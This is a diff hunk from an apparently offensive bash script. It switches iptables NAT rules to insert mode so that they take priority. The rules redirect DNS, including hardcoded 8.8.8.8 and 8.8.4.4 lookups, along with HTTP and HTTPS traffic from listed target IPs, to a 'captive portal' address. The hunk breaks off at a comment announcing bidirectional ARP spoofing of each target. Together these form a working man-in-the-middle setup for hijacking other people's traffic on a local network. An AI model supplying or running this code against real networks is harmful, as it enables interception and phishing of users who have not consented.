@@ -89,30 +89,30 @@ if [ ${#target_ips[@]} -eq 0 ]; then
 fi
 
 # Redirect DNS traffic (UDP and TCP) to captive portal
-iptables -t nat -A PREROUTING -i "$interface" -p udp --dport 53 -j DNAT --to-destination "$portal_ip"
-iptables -t nat -A PREROUTING -i "$interface" -p tcp --dport 53 -j DNAT --to-destination "$portal_ip"
+iptables -t nat -I PREROUTING -i "$interface" -p udp --dport 53 -j DNAT --to-destination "$portal_ip"
+iptables -t nat -I PREROUTING -i "$interface" -p tcp --dport 53 -j DNAT --to-destination "$portal_ip"
 
 # Redirect hardcoded user DNS (e.g., Google DNS)
-iptables -t nat -A PREROUTING -i "$interface" -p udp -d 8.8.8.8 --dport 53 -j DNAT --to-destination "$portal_ip"
-iptables -t nat -A PREROUTING -i "$interface" -p udp -d 8.8.4.4 --dport 53 -j DNAT --to-destination "$portal_ip"
+iptables -t nat -I PREROUTING -i "$interface" -p udp -d 8.8.8.8 --dport 53 -j DNAT --to-destination "$portal_ip"
+iptables -t nat -I PREROUTING -i "$interface" -p udp -d 8.8.4.4 --dport 53 -j DNAT --to-destination "$portal_ip"
 
 # Allow access to the captive portal
-iptables -t nat -A PREROUTING -i "$interface" -d "$portal_ip" -j ACCEPT
+iptables -t nat -I PREROUTING -i "$interface" -d "$portal_ip" -j ACCEPT
 
 # Exempt device IP and gateway IP
-iptables -t nat -A PREROUTING -i "$interface" -s "$device_ip" -j ACCEPT
-iptables -t nat -A PREROUTING -i "$interface" -d "$device_ip" -j ACCEPT
-iptables -t nat -A PREROUTING -i "$interface" -s "$gateway_ip" -j ACCEPT
-iptables -t nat -A PREROUTING -i "$interface" -d "$gateway_ip" -j ACCEPT
+iptables -t nat -I PREROUTING -i "$interface" -s "$device_ip" -j ACCEPT
+iptables -t nat -I PREROUTING -i "$interface" -d "$device_ip" -j ACCEPT
+iptables -t nat -I PREROUTING -i "$interface" -s "$gateway_ip" -j ACCEPT
+iptables -t nat -I PREROUTING -i "$interface" -d "$gateway_ip" -j ACCEPT
 
 # Redirect HTTP/HTTPS traffic to captive portal for target IPs
 for ip in "${target_ips[@]}"; do
-    iptables -t nat -A PREROUTING -i "$interface" -s "$ip" -p tcp --dport 80 -j DNAT --to-destination "$portal_ip"
-    iptables -t nat -A PREROUTING -i "$interface" -s "$ip" -p tcp --dport 443 -j DNAT --to-destination "$portal_ip"
+    iptables -t nat -I PREROUTING -i "$interface" -s "$ip" -p tcp --dport 80 -j DNAT --to-destination "$portal_ip"
+    iptables -t nat -I PREROUTING -i "$interface" -s "$ip" -p tcp --dport 443 -j DNAT --to-destination "$portal_ip"
 done
 
 # Masquerade outgoing traffic
-iptables -t nat -A POSTROUTING -o "$interface" -j MASQUERADE
+iptables -t nat -I POSTROUTING -o "$interface" -j MASQUERADE
 
 # Start bidirectional ARP spoofing for each target IP
 for ip in "${target_ips[@]}"; do
